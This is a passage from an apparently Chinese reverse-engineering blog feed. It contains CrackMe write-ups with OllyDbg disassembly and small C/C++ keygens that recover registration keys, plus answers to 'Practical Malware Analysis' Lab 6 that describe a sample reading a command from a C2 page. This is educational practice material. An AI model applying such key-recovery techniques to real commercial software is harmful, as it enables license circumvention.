class="hljs-number">0x7C</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span> &#125;<span class="hljs-comment">;</span><br>for (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; sizeof(key) / sizeof(int); i++)</span><br>&#123;<br>key[i] -= a<span class="hljs-comment">;</span><br>printf(<span class="hljs-string">&quot;%c&quot;</span>, key[i])<span class="hljs-comment">;</span><br>&#125;<br>return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/16/160CrackMe-011/8.png"></p><p><img src="/2021/08/16/160CrackMe-011/9.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为下断的原因一直分析第一个，那里只获取第一个数字，卡了半天，研究许久让我一度以为是CM的问题，有点蠢了。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-010</title>
    <link href="/2021/08/13/160CrackMe-010/"/>
    <url>/2021/08/13/160CrackMe-010/</url>
    
    <content type="html"><![CDATA[<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到只有一个输入key的地方，尝试输入发现弹出错误的弹窗。</p><p><img src="/2021/08/13/160CrackMe-010/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无壳，用VB语言编写的。</p><p><img src="/2021/08/13/160CrackMe-010/2.png"></p><p>使用OD打开，直接搜索错误的字符串，可以定位到关键的跳转，在上面就是一个比较函数，而其中又有一串字符串”kXy^rO|<em>yXo</em>m\kMuOn*+”，这个应该就是用来比较的了吧，函数头部下断开始分析。</p><p><img src="/2021/08/13/160CrackMe-010/3.png"></p><p>流程较短也比较简单，前面还有一个获取输入的长度，就不在分析了，直接看关键的计算部分。</p><p>获取输入的每一位KEY加上0xA形成新的KEY最后再与”kXy^rO|<em>yXo</em>m\kMuOn*+”作比较。那么用这段字符减去A就可以得到输入的key了，下面开始写注册机</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">00401F68   &gt; /85C0          <span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>00401F6A   . |0F84 BB000000 <span class="hljs-keyword">je</span> Andréna<span class="hljs-number">.</span>0040202B<br>00401F70   . |8D55 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]<br>00401F73   . |8D45 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br>00401F76   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401F77   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00401F78   . |C745 9C <span class="hljs-number">01000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x1</span><br>00401F7F   . |C745 <span class="hljs-number">94</span> <span class="hljs-number">02000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>],<span class="hljs-number">0x2</span><br>00401F86   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaI4Var&gt;<span class="hljs-comment">;  Msvbvm50.__vbaI4Var</span><br>00401F8C   . |8D4D BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]          <span class="hljs-comment">; |</span><br>00401F8F   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |Start = 0x4CE994</span><br>00401F90   . |8D55 <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]          <span class="hljs-comment">; |</span><br>00401F93   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |dString8 = 9E6A2546</span><br>00401F94   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |RetBUFFER = NULL</span><br>00401F95   . |FF15 <span class="hljs-number">34414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     <span class="hljs-comment">; \诸位获取</span><br>00401F9B   . |8D45 <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br>00401F9E   . |8D4D A8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x58</span>]<br>00401FA1   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String8 = 004CE994</span><br>00401FA2   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |ARG2 = 9E6A2546</span><br>00401FA3   . |FF15 <span class="hljs-number">64414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaStrVa&gt;<span class="hljs-comment">; \__vbaStrVarVal</span><br>00401FA9   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String = &quot;;&quot;</span><br>00401FAA   . |FF15 <span class="hljs-number">08414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     <span class="hljs-comment">; \转为ascii</span><br>00401FB0   . |<span class="hljs-number">66</span>:<span class="hljs-number">05</span> 0A00    <span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0xA</span>                               <span class="hljs-comment">;  +0xA</span><br>00401FB4   . |0F80 B0020000 <span class="hljs-keyword">jo</span> Andréna<span class="hljs-number">.</span>0040226A<br>00401FBA   . |0FBFD0        <span class="hljs-keyword">movsx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ax</span><br>00401FBD   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401FBE   . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">537</span>&gt;]     <span class="hljs-comment">;  ascii转字符</span><br>00401FC4   . |<span class="hljs-number">8985</span> 7CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>],<span class="hljs-built_in">eax</span><br>00401FCA   . |8D45 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00401FCD   . |8D8D 74FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>]<br>00401FD3   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00401FD4   . |8D95 64FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x9C</span>]<br>00401FDA   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00401FDB   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401FDC   . |C785 74FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>],<span class="hljs-number">0x8</span><br>00401FE6   . |FFD3          <span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaVarCat</span><br>00401FE8   . |8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>00401FEA   . |8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00401FED   . |FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaVarMove</span><br>00401FEF   . |8D4D A8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x58</span>]<br>00401FF2   . |FF15 B0414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaFreeS&gt;<span class="hljs-comment">;  Msvbvm50.__vbaFreeStr</span><br>00401FF8   . |8D85 74FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>]<br>00401FFE   . |8D4D <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br><span class="hljs-number">00402001</span>   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00402002</span>   . |8D55 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]<br><span class="hljs-number">00402005</span>   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00402006</span>   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-number">00402007</span>   . |6A <span class="hljs-number">03</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x3</span><br><span class="hljs-number">00402009</span>   . |FFD7          <span class="hljs-keyword">call</span> <span class="hljs-built_in">edi</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaFreeVarList</span><br>0040200B   . |83C4 <span class="hljs-number">10</span>       <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span><br>0040200E   . |8D85 ECFEFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x114</span>]<br><span class="hljs-number">00402014</span>   . |8D8D FCFEFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x104</span>]<br>0040201A   . |8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br><span class="hljs-number">0040201D</span>   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /TMPend8 = 004CE994</span><br>0040201E   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |TMPstep8 = 9E6A2546</span><br>0040201F   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Counter8 = NULL</span><br><span class="hljs-number">00402020</span>   . |FF15 A4414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForNext</span><br><span class="hljs-number">00402026</span>   .^\E9 3DFFFFFF   <span class="hljs-keyword">jmp</span> Andréna<span class="hljs-number">.</span>00401F68<br>0040202B   &gt; \8D45 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>0040202E   .  8D8D 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br><span class="hljs-number">00402034</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /var18 = 004CE994</span><br><span class="hljs-number">00402035</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |var28 = 9E6A2546</span><br><span class="hljs-number">00402036</span>   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],Andréna<span class="hljs-number">.0040</span>&gt;<span class="hljs-comment">; |kXy^rO|*yXo*m\kMuOn*+</span><br><span class="hljs-number">00402040</span>   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x8008</span>       <span class="hljs-comment">; |</span><br>0040204A   .  FF15 <span class="hljs-number">40414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarTs&gt;<span class="hljs-comment">; \__vbaVarTstEq</span><br></code></pre></div></td></tr></table></figure><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;kXy^rO|*yXo*m\\kMuOn*+&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++)<br>&#123;<br>key[i] = key[i] - <span class="hljs-number">0xA</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, key);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/13/160CrackMe-010/4.png"></p><p>输入正确的KEY</p><p><img src="/2021/08/13/160CrackMe-010/5.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>流程还是比较简单的，算法也很简单，总体上来讲难度不大。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验6</title>
    <link href="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/"/>
    <url>/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-6-1"><a href="#Lab-6-1" class="headerlink" title="Lab 6-1"></a>Lab 6-1</h2><h3 id="1-由main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#1-由main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="1.由main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>1.由main函数调用的唯一子过程中发现的主要代码结构是什么？</h3><p>使用IDA找到main函数看到调用了一个子函数sub_401000，F5即可看到伪代码。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-1.png"></p><p>可以看到调用了InternetGetConnectedState这个API，这个函数是用来检测是否联网的，判断本地网络状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">InternetGetConnectedState</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD lpdwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   dwReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>当存在一个连接时返回TRUE，否则返回FALSE。</p><h3 id="2-位于0x40105F的子过程是什么？"><a href="#2-位于0x40105F的子过程是什么？" class="headerlink" title="2.位于0x40105F的子过程是什么？"></a>2.位于0x40105F的子过程是什么？</h3><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-2.png"></p><p>这样确实看不太出来是做什么的。</p><p>这样看可以看到成功或者失败分别会压入栈不同的文字然后调用。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-3.png"></p><p>再看实际运行情况，推测应该是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-4.png"></p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>通过上面的函数分析可以得知，这是一个判断是否有网络连接的程序。如果存在网络连接返回1，否则返回0。</p><h2 id="Lab-6-2"><a href="#Lab-6-2" class="headerlink" title="Lab 6-2"></a>Lab 6-2</h2><h3 id="1-main函数调用的第一个子过程执行了什么操作？"><a href="#1-main函数调用的第一个子过程执行了什么操作？" class="headerlink" title="1.main函数调用的第一个子过程执行了什么操作？"></a>1.main函数调用的第一个子过程执行了什么操作？</h3><p>调用的第一个函数是sub_401000，调用了InternetGetConnectedState这个API判断当前是否连接了网络</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-1.png"></p><h3 id="2-位于0x40117F的子过程是什么？"><a href="#2-位于0x40117F的子过程是什么？" class="headerlink" title="2.位于0x40117F的子过程是什么？"></a>2.位于0x40117F的子过程是什么？</h3><p>查看此函数，发现与lab6-1是一样的，所以是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-2.png"></p><h3 id="3-被main函数调用的第二个子过程做了什么？"><a href="#3-被main函数调用的第二个子过程做了什么？" class="headerlink" title="3.被main函数调用的第二个子过程做了什么？"></a>3.被main函数调用的第二个子过程做了什么？</h3><p>首先调用了InternetOpenA初始化应用程序对 WinINet 函数的使用。</p><p>然后调用了InternetOpenUrlA下载“<a href="http://www.practicalmalwareanalysis.com/cc.htm%E2%80%9D%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2">http://www.practicalmalwareanalysis.com/cc.htm”这个页面</a></p><p>再调用InternetReadFile读取数据，如果读取的前几个字符是“&lt;!–”就成功，如果失败就会打印“Error 2.3: Fail to get command”，读取失败会打印“Error 2.2: Fail to ReadFile”</p><p>openurl失败会打印“Error 2.1: Fail to OpenUrl”</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-3.png"></p><p>再仔细分析一下返回值，可以看到前几个值如果比对都正确的话，那么会把第五个字符给al，而前几个字符是html页面的注释，也就是读取注释的第一个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-4.png"></p><p>这个函数结束之后，可以看出来后al的值会再次赋给[EBP+var_8]，最终会传给ecx，再压入栈作为printf的一个参数。可以看到压入栈一句话”Success: Parsed command is %c\n”，%c对应的就是这个值，打印出这个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-5.png"></p><h3 id="4-在这个子过程中使用了什么类型的代码结构？"><a href="#4-在这个子过程中使用了什么类型的代码结构？" class="headerlink" title="4.在这个子过程中使用了什么类型的代码结构？"></a>4.在这个子过程中使用了什么类型的代码结构？</h3><p>if-else的结构</p><h3 id="5-在这个程序中有任何基于网络的指示吗？"><a href="#5-在这个程序中有任何基于网络的指示吗？" class="headerlink" title="5.在这个程序中有任何基于网络的指示吗？"></a>5.在这个程序中有任何基于网络的指示吗？</h3><p>使用了Internet Explorer 7.5/pma作为InternetOpenA函数lpszAgent参数的值，还有<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AAURL%E3%80%82">http://www.practicalmalwareanalysis.com/cc.htm这个URL。</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-6.png"></p><h3 id="6-这个恶意代码的目的是什么？"><a href="#6-这个恶意代码的目的是什么？" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>首先判断是否联网，如果联网那么就会开始读取<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%EF%BC%8C%E7%84%B6%E5%90%8E%E8%8E%B7%E5%8F%96%E6%B3%A8%E9%87%8A%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%9C%80%E5%90%8E%E5%B0%86%E5%85%B6%E6%89%93%E5%8D%B0%E5%87%BA%E6%9D%A5%EF%BC%8C%E5%86%8D%E8%B0%83%E7%94%A8sleep%E5%87%BD%E6%95%B0">http://www.practicalmalwareanalysis.com/cc.htm这个页面的，然后获取注释的第一个字符，最后将其打印出来，再调用sleep函数</a></p><p><img 